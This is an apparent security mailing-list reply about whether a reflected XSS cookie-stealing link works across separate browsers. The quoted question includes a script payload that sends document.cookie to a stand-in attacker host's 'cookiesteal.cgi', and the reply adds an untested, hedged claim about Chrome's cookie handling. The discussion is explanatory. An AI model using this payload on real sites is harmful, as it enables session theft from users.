> Dear all,
>
> I have a little problem regarding XSS and here it is....
>
> To perform an XSS attack an attacker steals cookies (in this case) of an
> already logged in user.
>
> In this scenerio :
>
> -> The user is logged in "VulnerableRealBank.com" website in *one browser*
> .
>
> -> Now this user opens his email account in a *different browser* (and not
> in the new tab of the above browser) and clicks upon the link given
>
> http://VulnerableRealBank.com/index.php?sessionid=12412412<http://vulnerablerealbank.com/index.php?sessionid=12412412>
> &
>
> username=<script>document.location='http://attacker
> host.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>
>
> Now my Questions:
>
> -> Will the script that is reflected back from the vulnerable domain is
> capable to send the cookies to the atttacker that are maintained by the
> first browser.
>

In a different browser (and not tab), the Session ID cookie or any other
cookie will not be shared, therefore the attack would not execute.

>
> -> Is above thing possible if i says that i am using the browser version
> that do not shares cookies for the same domain requests.
>

I already answered the question. Different browser windows do not share
cookies.

>
> -> Is this the problem that is totally independent from the browsers
> versions and is only the functionality of the script that is sending
> cookies.
>

No, this issue is dependent on the type of browsers. I have heard (and not
tried myself) that Chrome handles cookies the same way even in tabs. So it
depends on how a browser handles cookies in tabs and/or windows.
